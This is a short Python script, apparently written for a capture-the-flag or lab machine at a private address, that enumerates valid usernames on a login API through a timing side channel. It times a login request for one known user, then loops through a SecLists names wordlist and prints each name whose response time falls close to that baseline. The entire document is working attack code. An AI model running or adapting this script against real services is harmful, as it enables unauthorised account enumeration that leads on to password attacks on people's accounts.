import time
import json
import requests

usernames=open("/usr/share/wordlists/seclists/Usernames/Names/names.txt","r")

data={ "username":"eduardo", "password":"hh"}
res1=time.time()
respuesta=requests.post("http://10.10.220.248/api/user/login",json=data)
res2=time.time()
res3=res2-res1
print("ideal time: "+str(res3))

for i in usernames:
	data1={ "username":i.strip(), "password":"hh"}
	v0=time.time()
	respuesta=requests.post("http://10.10.220.248/api/user/login",json=data1)
	v1=time.time()
	v2=v1-v0
	if v2 > res3*0.99 and v2 < res3*1.05 :
		print("Possible Username: "+i.strip())
